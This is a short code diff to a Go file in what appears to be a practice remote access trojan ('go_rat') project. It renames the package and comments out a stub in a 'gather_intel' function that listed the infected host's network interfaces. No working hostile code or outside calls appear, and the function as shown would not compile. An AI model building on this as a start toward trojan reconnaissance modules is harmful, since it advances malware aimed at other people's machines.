@@ -2,11 +2,10 @@
 This file contains the code for gathering host intelligence
 /*/
 
-package go_practice
+package go_rat
 
 // import the libraries we need
 import (
-	"net"
 	"strconv"
 )
 
@@ -16,8 +15,8 @@ the rat is in residence on
 */
 func gather_intel(intel_struct HostIntel) (HostIntel, error) {
 	// Get all network interfaces
-	interfaces, _ := net.Interfaces()
-	return interfaces
+	//interfaces, _ := net.Interfaces()
+	//return interfaces, nil
 }
 
 // Procs returns a slice of process objects
